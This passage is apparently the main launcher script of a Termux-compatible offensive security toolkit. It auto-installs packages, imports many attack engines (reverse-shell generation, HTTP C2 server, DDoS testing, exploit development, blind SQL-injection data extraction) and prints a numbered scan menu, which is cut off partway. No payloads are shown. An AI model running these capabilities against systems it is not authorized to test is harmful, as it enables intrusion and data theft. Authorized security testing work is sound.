#!/usr/bin/env python3
"""
 ███████╗██╗██████╗  ██████╗ ███████╗
 ╚══███╔╝██║██╔══██╗██╔═══██╗██╔════╝
   ███╔╝ ██║██████╔╝██║   ██║███████╗
  ███╔╝  ██║██╔═══╝ ██║   ██║╚════██║
 ███████╗██║██║     ╚██████╔╝███████║
 ╚══════╝╚═╝╚═╝      ╚═════╝ ╚══════╝

 ZYLON FUSION v2.0 - Advanced Security Reconnaissance & Vulnerability Platform
 Fused from omino + wizard + custom Zylon techniques + V2.0 Nuclear Modules
 Termux Non-Root Compatible | AI-Ready Architecture

 Coded by: Zylon | Hackathon Edition
 License: MIT
"""

import os
import sys
import time
import json
import socket
import random
import threading
import signal
import platform
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

# Add current directory to path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

# ============================================================================
# DETECT TERMUX ENVIRONMENT
# ============================================================================

def is_termux():
    """Detect if running in Termux"""
    return os.path.exists('/data/data/com.termux')

def get_prefix():
    """Get the appropriate prefix path"""
    if is_termux():
        return '/data/data/com.termux/files/usr'
    return '/usr'

def get_home():
    """Get home directory"""
    return os.environ.get('HOME', os.path.expanduser('~'))

# ============================================================================
# AUTO-INSTALL DEPENDENCIES (TERMUX-AWARE)
# ============================================================================

def install_requirements():
    """Auto-install required packages with Termux awareness"""
    required = {
        'requests': 'requests',
        'urllib3': 'urllib3',
        'rich': 'rich',
        'colorama': 'colorama',
        'beautifulsoup4': 'bs4',
        'dnspython': 'dns',
        'whois': 'whois',
        'lxml': 'lxml',
        'cryptography': 'cryptography',
        'aiohttp': 'aiohttp',
        'pyyaml': 'yaml',
    }
    
    missing = []
    for package, module in required.items():
        try:
            __import__(module)
        except ImportError:
            missing.append(package)
    
    if missing:
        print(f"[*] Installing missing packages: {', '.join(missing)}")
        pip_cmd = 'pip3' if os.system('which pip3 > /dev/null 2>&1') == 0 else 'pip'
        for package in missing:
            os.system(f"{pip_cmd} install {package} --quiet 2>/dev/null")
        print("[+] All packages installed!\n")
        time.sleep(1)

# Install on first run
install_requirements()

# ============================================================================
# THIRD-PARTY IMPORTS
# ============================================================================

import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
from rich.text import Text
from rich import box
from rich.prompt import Prompt, Confirm
from rich.layout import Layout
from colorama import Fore, Back, Style, init as colorama_init
from bs4 import BeautifulSoup
import dns.resolver
from urllib.parse import urlparse, urljoin, parse_qs

# Optional imports with graceful fallback
try:
    import whois as pythonwhois
    WHOIS_AVAILABLE = True
except ImportError:
    WHOIS_AVAILABLE = False

try:
    import ssl
    SSL_AVAILABLE = True
except ImportError:
    SSL_AVAILABLE = False

try:
    import aiohttp
    import asyncio
    AIOHTTP_AVAILABLE = True
except ImportError:
    AIOHTTP_AVAILABLE = False

# Initialize colorama
colorama_init(autoreset=True)
console = Console()

# ============================================================================
# IMPORT ZYLON MODULES
# ============================================================================

from core.var import *

# ============================================================================
# SAFE ENGINE IMPORTS - Graceful degradation if any engine has missing deps
# ============================================================================

_FAILED_IMPORTS = []

def _safe_import(module_path, names, alias_map=None):
    """Safely import names from a module. Returns dict of {local_name: object}."""
    results = {}
    alias_map = alias_map or {}
    try:
        mod = __import__(module_path, fromlist=names)
        for name in names:
            local_name = alias_map.get(name, name)
            results[local_name] = getattr(mod, name)
    except ImportError as e:
        _FAILED_IMPORTS.append((module_path, str(e)))
        for name in names:
            local_name = alias_map.get(name, name)
            results[local_name] = None
    return results

# Core engines
_i = _safe_import('core.recon', ['ReconEngine']); ReconEngine = _i['ReconEngine']
_i = _safe_import('core.vuln', ['VulnEngine']); VulnEngine = _i['VulnEngine']
_i = _safe_import('core.network', ['NetworkEngine']); NetworkEngine = _i['NetworkEngine']
_i = _safe_import('core.web', ['WebEngine']); WebEngine = _i['WebEngine']
_i = _safe_import('core.reports', ['ReportEngine']); ReportEngine = _i['ReportEngine']
_i = _safe_import('core.ai_bridge', ['AIBridge']); AIBridge = _i['AIBridge']
_i = _safe_import('core.advanced_recon', ['AdvancedRecon']); AdvancedRecon = _i['AdvancedRecon']
_i = _safe_import('core.injections', ['InjectionArsenal']); InjectionArsenal = _i['InjectionArsenal']
_i = _safe_import('core.advanced_web', ['AdvancedWebAttacks']); AdvancedWebAttacks = _i['AdvancedWebAttacks']
_i = _safe_import('core.bounty_workflow', ['BugBountyWorkflow']); BugBountyWorkflow = _i['BugBountyWorkflow']
_i = _safe_import('core.v2_recon', ['V2ReconEngine']); V2ReconEngine = _i['V2ReconEngine']
_i = _safe_import('core.v2_vuln', ['V2VulnEngine']); V2VulnEngine = _i['V2VulnEngine']
_i = _safe_import('core.origin_ip', ['OriginIPEngine']); OriginIPEngine = _i['OriginIPEngine']
_i = _safe_import('core.hakuin_engine', ['HakuinEngine', 'BlindSQLiDetector']); HakuinEngine = _i['HakuinEngine']; BlindSQLiDetector = _i['BlindSQLiDetector']
_i = _safe_import('core.cmd_injection_engine', ['CommandInjectionEngine']); CommandInjectionEngine = _i['CommandInjectionEngine']
_i = _safe_import('core.ssrf_engine', ['SSRFEngine']); SSRFEngine = _i['SSRFEngine']
_i = _safe_import('core.race_engine', ['RaceEngine']); RaceEngine = _i['RaceEngine']
_i = _safe_import('core.graphql_engine', ['GraphQLEngine']); GraphQLEngine = _i['GraphQLEngine']
_i = _safe_import('core.ciphey_engine', ['CipheyEngine', 'run_ciphey_scan', 'run_hash_identifier']); CipheyEngine = _i['CipheyEngine']; run_ciphey_scan = _i['run_ciphey_scan']; run_hash_identifier = _i['run_hash_identifier']
_i = _safe_import('core.jwt_engine', ['JWTEngine', 'run_jwt_scan']); JWTEngine = _i['JWTEngine']; run_jwt_scan = _i['run_jwt_scan']
_i = _safe_import('core.ssti_engine', ['SSTIEngine', 'run_ssti_scan']); SSTIEngine = _i['SSTIEngine']; run_ssti_scan = _i['run_ssti_scan']
_i = _safe_import('core.nosql_engine', ['NoSQLEngine', 'run_nosql_scan']); NoSQLEngine = _i['NoSQLEngine']; run_nosql_scan = _i['run_nosql_scan']
_i = _safe_import('core.container_engine', ['ContainerEngine', 'run_container_scan']); ContainerEngine = _i['ContainerEngine']; run_container_scan = _i['run_container_scan']
_i = _safe_import('core.waf_evasion_engine', ['WAFFingerprinter', 'WAFBypassEngine', 'run_waf_scan']); WAFFingerprinter = _i['WAFFingerprinter']; WAFBypassEngine = _i['WAFBypassEngine']; run_waf_scan = _i['run_waf_scan']
_i = _safe_import('core.advanced_attacks_engine', ['WebSocketSecurityEngine', 'HTTPSmugglingEngine', 'CRLFEngine', 'OpenRedirectEngine', 'Bypass403Engine']); WebSocketSecurityEngine = _i['WebSocketSecurityEngine']; HTTPSmugglingEngine = _i['HTTPSmugglingEngine']; CRLFEngine = _i['CRLFEngine']; OpenRedirectEngine = _i['OpenRedirectEngine']; Bypass403Engine = _i['Bypass403Engine']
_i = _safe_import('core.advanced_attacks_engine', ['run_websocket_scan', 'run_smuggling_scan', 'run_crlf_scan', 'run_openredirect_scan', 'run_403bypass_scan']); run_websocket_scan = _i['run_websocket_scan']; run_smuggling_scan = _i['run_smuggling_scan']; run_crlf_scan = _i['run_crlf_scan']; run_openredirect_scan = _i['run_openredirect_scan']; run_403bypass_scan = _i['run_403bypass_scan']
_i = _safe_import('core.recon_engines', ['ParamSpiderEngine', 'LinkFinderEngine', 'ArjunEngine', 'GhauriEngine', 'CMSeeKEngine', 'SherlockEngine', 'TehqeeqEngine']); ParamSpiderEngine = _i['ParamSpiderEngine']; LinkFinderEngine = _i['LinkFinderEngine']; ArjunEngine = _i['ArjunEngine']; GhauriEngine = _i['GhauriEngine']; CMSeeKEngine = _i['CMSeeKEngine']; SherlockEngine = _i['SherlockEngine']; TehqeeqEngine = _i['TehqeeqEngine']
_i = _safe_import('core.recon_engines', ['run_paramspider', 'run_linkfinder', 'run_arjun', 'run_ghauri', 'run_cmseek', 'run_sherlock', 'run_tehqeeq']); run_paramspider = _i['run_paramspider']; run_linkfinder = _i['run_linkfinder']; run_arjun = _i['run_arjun']; run_ghauri = _i['run_ghauri']; run_cmseek = _i['run_cmseek']; run_sherlock = _i['run_sherlock']; run_tehqeeq = _i['run_tehqeeq']
_i = _safe_import('core.battle_engine', ['BattleEngine']); BattleEngine = _i['BattleEngine']
_i = _safe_import('core.ddos_engine', ['DDoSDefenseEngine']); DDoSDefenseEngine = _i['DDoSDefenseEngine']
_i = _safe_import('core.lfi_engine', ['LFIEngine', 'run_lfi_scan']); LFIEngine = _i['LFIEngine']; run_lfi_scan = _i['run_lfi_scan']
_i = _safe_import('core.xss_engine', ['XSSEngine', 'run_xss_scan']); XSSEngine = _i['XSSEngine']; run_xss_scan = _i['run_xss_scan']
_i = _safe_import('core.subdomain_engine', ['SubdomainEngine', 'run_subdomain_scan']); SubdomainEngine = _i['SubdomainEngine']; run_subdomain_scan = _i['run_subdomain_scan']
_i = _safe_import('core.crypto_engine', ['CryptoEngine', 'run_crypto_scan']); CryptoEngine = _i['CryptoEngine']; run_crypto_scan = _i['run_crypto_scan']
_i = _safe_import('core.shellgen_engine', ['ReverseShellEngine', 'run_shellgen_scan']); ReverseShellEngine = _i['ReverseShellEngine']; run_shellgen_scan = _i['run_shellgen_scan']
_i = _safe_import('core.cms_engine', ['CMSEngine', 'run_cms_scan']); CMSEngine = _i['CMSEngine']; run_cms_scan = _i['run_cms_scan']
_i = _safe_import('core.osint_engine', ['OSINTEngine', 'run_osint_scan']); OSINTEngine = _i['OSINTEngine']; run_osint_scan = _i['run_osint_scan']
_i = _safe_import('core.cloud_engine', ['CloudSecurityEngine', 'run_cloud_scan']); CloudSecurityEngine = _i['CloudSecurityEngine']; run_cloud_scan = _i['run_cloud_scan']
_i = _safe_import('core.cors_engine', ['CORSEngine', 'run_cors_scan']); CORSEngine = _i['CORSEngine']; run_cors_scan = _i['run_cors_scan']
_i = _safe_import('core.xxe_engine', ['XXEEngine', 'run_xxe_scan']); XXEEngine = _i['XXEEngine']; run_xxe_scan = _i['run_xxe_scan']
_i = _safe_import('core.advanced_web2_engine', ['AdvancedWebEngine', 'run_advanced_web_scan']); AdvancedWebEngine = _i['AdvancedWebEngine']; run_advanced_web_scan = _i['run_advanced_web_scan']
_i = _safe_import('core.git_exposure_engine', ['GitExposureEngine', 'run_git_scan']); GitExposureEngine = _i['GitExposureEngine']; run_git_scan = _i['run_git_scan']
_i = _safe_import('core.utility_engine', ['UtilityEngine', 'run_utility_scan']); UtilityEngine = _i['UtilityEngine']; run_utility_scan = _i['run_utility_scan']
_i = _safe_import('core.subdomain_advanced_engine', ['run'], {'run': 'run_subdomain_advanced'}); run_subdomain_advanced = _i['run_subdomain_advanced']; SubdomainAdvancedEngine = None
_i = _safe_import('core.osint_advanced_engine', ['run'], {'run': 'run_osint_advanced'}); run_osint_advanced = _i['run_osint_advanced']; OSINTAdvancedEngine = None
_i = _safe_import('core.sqlmap_engine', ['run'], {'run': 'run_sqlmap_scan'}); run_sqlmap_scan = _i['run_sqlmap_scan']; SQLMapEngine = None
_i = _safe_import('core.xssstrike_engine', ['run'], {'run': 'run_xssstrike_scan'}); run_xssstrike_scan = _i['run_xssstrike_scan']; XSStrikeEngine = None
_i = _safe_import('core.lfi_advanced_engine', ['run'], {'run': 'run_lfi_advanced_scan'}); run_lfi_advanced_scan = _i['run_lfi_advanced_scan']; LFIAdvancedEngine = None
_i = _safe_import('core.path_traversal_engine', ['run'], {'run': 'run_path_traversal_scan'}); run_path_traversal_scan = _i['run_path_traversal_scan']; PathTraversalEngine = None
_i = _safe_import('core.tplmap_engine', ['run'], {'run': 'run_tplmap_scan'}); run_tplmap_scan = _i['run_tplmap_scan']; TPLmapEngine = None
_i = _safe_import('core.nuclei_style_engine', ['run'], {'run': 'run_nuclei_scan'}); run_nuclei_scan = _i['run_nuclei_scan']; NucleiStyleEngine = None
_i = _safe_import('core.wapiti_engine', ['run'], {'run': 'run_wapiti_scan'}); run_wapiti_scan = _i['run_wapiti_scan']; WapitiEngine = None
_i = _safe_import('core.dirsearch_engine', ['run'], {'run': 'run_dirsearch_scan'}); run_dirsearch_scan = _i['run_dirsearch_scan']; DirsearchEngine = None
_i = _safe_import('core.session_security_engine', ['run'], {'run': 'run_session_security_scan'}); run_session_security_scan = _i['run_session_security_scan']; SessionSecurityEngine = None
_i = _safe_import('core.deserialization_engine', ['run'], {'run': 'run_deserialization_scan'}); run_deserialization_scan = _i['run_deserialization_scan']; DeserializationEngine = None
_i = _safe_import('core.cloud_advanced_engine', ['run'], {'run': 'run_cloud_advanced'}); run_cloud_advanced = _i['run_cloud_advanced']; CloudAdvancedEngine = None
_i = _safe_import('core.container_advanced_engine', ['run'], {'run': 'run_container_advanced'}); run_container_advanced = _i['run_container_advanced']; ContainerAdvancedEngine = None
_i = _safe_import('core.credential_engine', ['run'], {'run': 'run_credential_scan'}); run_credential_scan = _i['run_credential_scan']; CredentialEngine = None
_i = _safe_import('core.takeover_advanced_engine', ['run'], {'run': 'run_takeover_advanced_scan'}); run_takeover_advanced_scan = _i['run_takeover_advanced_scan']; TakeoverAdvancedEngine = None
_i = _safe_import('core.cors_advanced_engine', ['run'], {'run': 'run_cors_advanced_scan'}); run_cors_advanced_scan = _i['run_cors_advanced_scan']; CORSAdvancedEngine = None
_i = _safe_import('core.oast_engine', ['run'], {'run': 'run_oast_scan'}); run_oast_scan = _i['run_oast_scan']; OASTEngine = None
_i = _safe_import('core.redos_csp_engine', ['run'], {'run': 'run_redos_csp_scan'}); run_redos_csp_scan = _i['run_redos_csp_scan']; ReDoSCSPEngine = None
_i = _safe_import('core.git_advanced_engine', ['run'], {'run': 'run_git_advanced_scan'}); run_git_advanced_scan = _i['run_git_advanced_scan']; GitAdvancedEngine = None
_i = _safe_import('core.web_fuzzer_engine', ['run'], {'run': 'run_web_fuzzer'}); run_web_fuzzer = _i['run_web_fuzzer']; WebFuzzerEngine = None
_i = _safe_import('core.shellgen_advanced_engine', ['run'], {'run': 'run_shellgen_advanced'}); run_shellgen_advanced = _i['run_shellgen_advanced']; ShellGenAdvancedEngine = None
_i = _safe_import('core.hash_advanced_engine', ['run'], {'run': 'run_hash_advanced'}); run_hash_advanced = _i['run_hash_advanced']; HashAdvancedEngine = None
_i = _safe_import('core.ai_pentest_engine', ['run'], {'run': 'run_ai_pentest'}); run_ai_pentest = _i['run_ai_pentest']; AIPentestEngine = None
_i = _safe_import('core.stealth_engine', ['run'], {'run': 'run_stealth_scan'}); run_stealth_scan = _i['run_stealth_scan']; StealthEngine = None
_i = _safe_import('core.wordlist_engine', ['run'], {'run': 'run_wordlist_gen'}); run_wordlist_gen = _i['run_wordlist_gen']; WordlistEngine = None
_i = _safe_import('core.ddos_testing_engine', ['run'], {'run': 'run_ddos_testing'}); run_ddos_testing = _i['run_ddos_testing']; DDoSTestingEngine = None
_i = _safe_import('core.cms_advanced_engine', ['run'], {'run': 'run_cms_advanced'}); run_cms_advanced = _i['run_cms_advanced']; CMSAdvancedEngine = None
_i = _safe_import('core.crypto_advanced_engine', ['run'], {'run': 'run_crypto_advanced'}); run_crypto_advanced = _i['run_crypto_advanced']; CryptoAdvancedEngine = None
_i = _safe_import('core.dalfox_engine', ['run'], {'run': 'run_dalfox_scan'}); run_dalfox_scan = _i['run_dalfox_scan']; DalfoxEngine = None
_i = _safe_import('core.mass_vuln_engine', ['run'], {'run': 'run_mass_vuln_scan'}); run_mass_vuln_scan = _i['run_mass_vuln_scan']; MassVulnEngine = None
_i = _safe_import('core.bizlogic_engine', ['run'], {'run': 'run_bizlogic_scan'}); run_bizlogic_scan = _i['run_bizlogic_scan']; BizLogicEngine = None
_i = _safe_import('core.websocket_engine', ['run'], {'run': 'run_ws_scan'}); run_ws_scan = _i['run_ws_scan']; WebSocketEngine = None
_i = _safe_import('core.h2c_engine', ['run'], {'run': 'run_h2c_scan'}); run_h2c_scan = _i['run_h2c_scan']; H2CEngine = None
_i = _safe_import('core.prototype_engine', ['run'], {'run': 'run_pp_scan'}); run_pp_scan = _i['run_pp_scan']; PrototypeEngine = None
_i = _safe_import('core.payload_db_engine', ['run'], {'run': 'run_payload_db'}); run_payload_db = _i['run_payload_db']; PayloadDBEngine = None
_i = _safe_import('core.exploit_dev_engine', ['run'], {'run': 'run_exploit_dev'}); run_exploit_dev = _i['run_exploit_dev']; ExploitDevEngine = None
_i = _safe_import('core.metadata_engine', ['run'], {'run': 'run_metadata'}); run_metadata = _i['run_metadata']; MetadataEngine = None
_i = _safe_import('core.bounty_mgmt_engine', ['run'], {'run': 'run_bounty_mgmt'}); run_bounty_mgmt = _i['run_bounty_mgmt']; BountyMgmtEngine = None
_i = _safe_import('core.cache_poison_advanced_engine', ['run'], {'run': 'run_cache_poison_adv'}); run_cache_poison_adv = _i['run_cache_poison_adv']; CachePoisonAdvancedEngine = None
_i = _safe_import('core.mobile_security_engine', ['run'], {'run': 'run_mobile_security'}); run_mobile_security = _i['run_mobile_security']; MobileSecurityEngine = None

# Performance engine (used for speed optimization)
_i = _safe_import('core.performance', ['DNSCache', 'OptimizedSession', 'AdaptiveThreading', 'RateLimiter', 'SmartTimeout', 'get_performance_stats']); DNSCache = _i.get('DNSCache'); OptimizedSession = _i.get('OptimizedSession'); AdaptiveThreading = _i.get('AdaptiveThreading'); RateLimiter = _i.get('RateLimiter'); SmartTimeout = _i.get('SmartTimeout'); get_performance_stats = _i.get('get_performance_stats')

# Orphaned engines (v3, v4, v5) — powerful but NOT yet wired to scan_map
_i = _safe_import('core.v3_security', ['V3SecurityEngine']); V3SecurityEngine = _i.get('V3SecurityEngine')
_i = _safe_import('core.v4_hunting', ['V4HuntingEngine']); V4HuntingEngine = _i.get('V4HuntingEngine')
_i = _safe_import('core.v5_async_engine', ['V5AsyncEngine']); V5AsyncEngine = _i.get('V5AsyncEngine')
_i = _safe_import('core.http_c2', ['HTTPC2Server']); HTTPC2Server = _i.get('HTTPC2Server')

# Also get the class-based engines from modules that use 'run' function pattern
_i = _safe_import('core.subdomain_advanced_engine', ['SubdomainAdvancedEngine']); SubdomainAdvancedEngine = _i.get('SubdomainAdvancedEngine', SubdomainAdvancedEngine)
_i = _safe_import('core.osint_advanced_engine', ['OSINTAdvancedEngine']); OSINTAdvancedEngine = _i.get('OSINTAdvancedEngine', OSINTAdvancedEngine)
_i = _safe_import('core.sqlmap_engine', ['SQLMapEngine']); SQLMapEngine = _i.get('SQLMapEngine', SQLMapEngine)
_i = _safe_import('core.xssstrike_engine', ['XSStrikeEngine']); XSStrikeEngine = _i.get('XSStrikeEngine', XSStrikeEngine)
_i = _safe_import('core.lfi_advanced_engine', ['LFIAdvancedEngine']); LFIAdvancedEngine = _i.get('LFIAdvancedEngine', LFIAdvancedEngine)
_i = _safe_import('core.path_traversal_engine', ['PathTraversalEngine']); PathTraversalEngine = _i.get('PathTraversalEngine', PathTraversalEngine)
_i = _safe_import('core.tplmap_engine', ['TPLmapEngine']); TPLmapEngine = _i.get('TPLmapEngine', TPLmapEngine)
_i = _safe_import('core.nuclei_style_engine', ['NucleiStyleEngine']); NucleiStyleEngine = _i.get('NucleiStyleEngine', NucleiStyleEngine)
_i = _safe_import('core.wapiti_engine', ['WapitiEngine']); WapitiEngine = _i.get('WapitiEngine', WapitiEngine)
_i = _safe_import('core.dirsearch_engine', ['DirsearchEngine']); DirsearchEngine = _i.get('DirsearchEngine', DirsearchEngine)
_i = _safe_import('core.session_security_engine', ['SessionSecurityEngine']); SessionSecurityEngine = _i.get('SessionSecurityEngine', SessionSecurityEngine)
_i = _safe_import('core.deserialization_engine', ['DeserializationEngine']); DeserializationEngine = _i.get('DeserializationEngine', DeserializationEngine)
_i = _safe_import('core.cloud_advanced_engine', ['CloudAdvancedEngine']); CloudAdvancedEngine = _i.get('CloudAdvancedEngine', CloudAdvancedEngine)
_i = _safe_import('core.container_advanced_engine', ['ContainerAdvancedEngine']); ContainerAdvancedEngine = _i.get('ContainerAdvancedEngine', ContainerAdvancedEngine)
_i = _safe_import('core.credential_engine', ['CredentialEngine']); CredentialEngine = _i.get('CredentialEngine', CredentialEngine)
_i = _safe_import('core.takeover_advanced_engine', ['TakeoverAdvancedEngine']); TakeoverAdvancedEngine = _i.get('TakeoverAdvancedEngine', TakeoverAdvancedEngine)
_i = _safe_import('core.cors_advanced_engine', ['CORSAdvancedEngine']); CORSAdvancedEngine = _i.get('CORSAdvancedEngine', CORSAdvancedEngine)
_i = _safe_import('core.oast_engine', ['OASTEngine']); OASTEngine = _i.get('OASTEngine', OASTEngine)
_i = _safe_import('core.redos_csp_engine', ['ReDoSCSPEngine']); ReDoSCSPEngine = _i.get('ReDoSCSPEngine', ReDoSCSPEngine)
_i = _safe_import('core.git_advanced_engine', ['GitAdvancedEngine']); GitAdvancedEngine = _i.get('GitAdvancedEngine', GitAdvancedEngine)
_i = _safe_import('core.web_fuzzer_engine', ['WebFuzzerEngine']); WebFuzzerEngine = _i.get('WebFuzzerEngine', WebFuzzerEngine)
_i = _safe_import('core.shellgen_advanced_engine', ['ShellGenAdvancedEngine']); ShellGenAdvancedEngine = _i.get('ShellGenAdvancedEngine', ShellGenAdvancedEngine)
_i = _safe_import('core.hash_advanced_engine', ['HashAdvancedEngine']); HashAdvancedEngine = _i.get('HashAdvancedEngine', HashAdvancedEngine)
_i = _safe_import('core.ai_pentest_engine', ['AIPentestEngine']); AIPentestEngine = _i.get('AIPentestEngine', AIPentestEngine)
_i = _safe_import('core.stealth_engine', ['StealthEngine']); StealthEngine = _i.get('StealthEngine', StealthEngine)
_i = _safe_import('core.wordlist_engine', ['WordlistEngine']); WordlistEngine = _i.get('WordlistEngine', WordlistEngine)
_i = _safe_import('core.ddos_testing_engine', ['DDoSTestingEngine']); DDoSTestingEngine = _i.get('DDoSTestingEngine', DDoSTestingEngine)
_i = _safe_import('core.cms_advanced_engine', ['CMSAdvancedEngine']); CMSAdvancedEngine = _i.get('CMSAdvancedEngine', CMSAdvancedEngine)
_i = _safe_import('core.crypto_advanced_engine', ['CryptoAdvancedEngine']); CryptoAdvancedEngine = _i.get('CryptoAdvancedEngine', CryptoAdvancedEngine)
_i = _safe_import('core.dalfox_engine', ['DalfoxEngine']); DalfoxEngine = _i.get('DalfoxEngine', DalfoxEngine)
_i = _safe_import('core.mass_vuln_engine', ['MassVulnEngine']); MassVulnEngine = _i.get('MassVulnEngine', MassVulnEngine)
_i = _safe_import('core.bizlogic_engine', ['BizLogicEngine']); BizLogicEngine = _i.get('BizLogicEngine', BizLogicEngine)
_i = _safe_import('core.websocket_engine', ['WebSocketEngine']); WebSocketEngine = _i.get('WebSocketEngine', WebSocketEngine)
_i = _safe_import('core.h2c_engine', ['H2CEngine']); H2CEngine = _i.get('H2CEngine', H2CEngine)
_i = _safe_import('core.prototype_engine', ['PrototypeEngine']); PrototypeEngine = _i.get('PrototypeEngine', PrototypeEngine)
_i = _safe_import('core.payload_db_engine', ['PayloadDBEngine']); PayloadDBEngine = _i.get('PayloadDBEngine', PayloadDBEngine)
_i = _safe_import('core.exploit_dev_engine', ['ExploitDevEngine']); ExploitDevEngine = _i.get('ExploitDevEngine', ExploitDevEngine)
_i = _safe_import('core.metadata_engine', ['MetadataEngine']); MetadataEngine = _i.get('MetadataEngine', MetadataEngine)
_i = _safe_import('core.bounty_mgmt_engine', ['BountyMgmtEngine']); BountyMgmtEngine = _i.get('BountyMgmtEngine', BountyMgmtEngine)
_i = _safe_import('core.cache_poison_advanced_engine', ['CachePoisonAdvancedEngine']); CachePoisonAdvancedEngine = _i.get('CachePoisonAdvancedEngine', CachePoisonAdvancedEngine)
_i = _safe_import('core.mobile_security_engine', ['MobileSecurityEngine']); MobileSecurityEngine = _i.get('MobileSecurityEngine', MobileSecurityEngine)

# Show warnings for failed imports (after Console is available)
def _show_import_warnings():
    """Show warnings for any engines that failed to import"""
    if _FAILED_IMPORTS:
        try:
            console = Console()
            console.print(f"\n[bold yellow][!] {len(_FAILED_IMPORTS)} module(s) failed to import:[/bold yellow]")
            for mod_path, err in _FAILED_IMPORTS:
                console.print(f"  [dim]- {mod_path}: {err}[/dim]")
            console.print("[bold cyan][*] Run 'fix' command to install missing dependencies[/bold cyan]\n")
        except Exception:
            print(f"[!] {len(_FAILED_IMPORTS)} module(s) failed to import. Run 'fix' command.")

# ============================================================================
# SIGNAL HANDLER
# ============================================================================

def signal_handler(sig, frame):
    console.print("\n[bold yellow][!] ZYLON shutting down gracefully...[/bold yellow]")
    # Cleanup: close any open sessions
    try:
        import threading
        for thread in threading.enumerate():
            if thread != threading.current_thread():
                thread.join(timeout=1)
    except Exception:
        pass
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

# ============================================================================
# BANNER & UI
# ============================================================================

class ZylonUI:
    """ZYLON terminal UI engine"""
    
    @staticmethod
    def display_banner():
        """Display the ZYLON fusion banner"""
        console.clear()
        
        # Animated intro
        with console.status("[bold red]Initializing ZYLON FUSION...[/bold red]", spinner="dots"):
            time.sleep(0.8)
        
        banner = f"""
[bold red]
    ███████╗██╗██████╗  ██████╗ ███████╗
    ╚══███╔╝██║██╔══██╗██╔═══██╗██╔════╝
      ███╔╝ ██║██████╔╝██║   ██║███████╗
     ███╔╝  ██║██╔═══╝ ██║   ██║╚════██║
    ███████╗██║██║     ╚██████╔╝███████║
    ╚══════╝╚═╝╚═╝      ╚═════╝ ╚══════╝
[/bold red]
[bold yellow]    FUSION v2.0 NUCLEAR - Advanced Security & Bug Bounty Platform[/bold yellow]
[bold cyan]    omino + wizard + Zylon Custom + V2.0 Nuclear Modules | Termux Non-Root[/bold cyan]
"""
        console.print(Panel(banner, border_style="bright_red", box=box.HEAVY))
        
        # Info table
        info = Table(box=box.ROUNDED, border_style="bright_yellow", show_header=False,
                     title="[bold yellow] System Info[/bold yellow]")
        info.add_column("Key", style="cyan")
        info.add_column("Value", style="green")
        info.add_row(" Version", ZYLON_VERSION)
        info.add_row(" Codename", ZYLON_CODENAME)
        info.add_row(" Environment", "Termux" if is_termux() else f"{platform.system()} {platform.release()}")
        info.add_row(" Python", platform.python_version())
        info.add_row(" Date", datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
        try:
            is_root = os.geteuid() == 0
        except AttributeError:
            is_root = False
        info.add_row(" Root Access", "No (Non-Root Mode)" if not is_root else "Yes")
        console.print(info)
        console.print()
    
    @staticmethod
    def display_help():
        """Display help menu"""
        help_table = Table(
            title="[bold yellow] ZYLON FUSION - Commands & Scan Types[/bold yellow]",
            box=box.DOUBLE, border_style="bright_magenta"
        )
        help_table.add_column("Command", style="bold cyan")
        help_table.add_column("Description", style="white")
        
        commands = [
            ("help", "Show this help menu"),
            ("0", "Full Reconnaissance (OSINT + DNS + Subdomains + Headers)"),
            ("1", "WHOIS Domain Lookup"),
            ("2", "Geo-IP Location"),
            ("3", "DNS Records Enumeration"),
            ("4", "Subdomain Discovery (Multi-Source)"),
            ("5", "Port Scanner (Connect Scan - No Root)"),
            ("6", "Banner Grabbing & Fingerprinting"),
            ("7", "HTTP Security Headers Analysis"),
            ("8", "SSL/TLS Certificate Analysis"),
            ("9", "SQL Injection Scanner"),
            ("10", "XSS (Cross-Site Scripting) Scanner"),
            ("11", "Directory & File Brute Force"),
            ("12", "WordPress Security Scan"),
            ("13", "CORS Misconfiguration Detector"),
            ("14", "Open Redirect Detector"),
            ("15", "CRLF Injection Scanner"),
            ("16", "Cookie Security Analyzer"),
            ("17", "JavaScript Sensitive Data Extractor"),
            ("18", "Cloud Storage Bucket Detector"),
            ("19", "WAF Detector & Fingerprinter"),
            ("20", "Technology Stack Fingerprinter"),
            ("21", "Full Vulnerability Assessment"),
            ("22", "Nuclear Scan (Core Modules)"),
            # === BUG BOUNTY ARSENAL ===
            ("23", "Deep Web Crawler (URL Discovery)"),
            ("24", "Parameter Miner (Hidden Params)"),
            ("25", "Wayback URL Discovery"),
            ("26", "Google Dorking"),
            ("27", "GitHub Secret Dorking"),
            ("28", "Deep JS Analysis"),
            ("29", "Subdomain Takeover Check"),
            ("30", "SSRF Scanner"),
            ("31", "SSTI (Template Injection) Scanner"),
            ("32", "Path Traversal / LFI Scanner"),
            ("33", "XXE (XML Entity) Scanner"),
            ("34", "IDOR Detector"),
            ("35", "Race Condition Tester"),
            ("36", "Prototype Pollution Scanner"),
            ("37", "Web Cache Poisoning"),
            ("38", "HTTP Request Smuggling"),
            ("39", "Host Header Injection"),
            ("40", "JWT Vulnerability Scanner"),
            ("41", "Broken Authentication Detector"),
            # V2.0 Nuclear Modules
            ("44", "API Endpoint Discovery + Fuzzer"),
            ("45", "Rate Limit Tester"),
            ("46", "Sensitive File Deep Scanner"),
            ("47", "Email Enumeration"),
            ("48", "Broken Link Hijacker"),
            ("49", "Tech Version + CVE Lookup"),
            # Origin IP Finder
            ("50", "Origin IP Finder (Quick - Top Techniques)"),
            ("51", "Origin IP Finder (Full - All 22 Techniques)"),
            ("52", "CDN/WAF Detection & Fingerprinting"),
            ("53", "DNS History + Cert Transparency IP Hunt"),
            ("54", "Subdomain Resolution + CDN IP Filter"),
            ("55", "Direct IP Verification (Host Header)"),
            # Hakuin-Optimized Blind SQLi (v3.0 Fusion)
            ("56", "Blind SQLi Detector (Auto-Detect Vulnerability)"),
            ("57", "Blind SQLi Schema Extraction (Hakuin-Optimized)"),
            ("58", "Blind SQLi Metadata Extract (Tables + Columns)"),
            ("59", "Blind SQLi Data Extraction (Binary Search - 10x Faster)"),
            ("60", "Blind SQLi Full Pipeline (Detect + Extract All)"),
            # Command Injection (Commix Fusion v3.0)
            ("61", "Command Injection Detector (Commix Fusion)"),
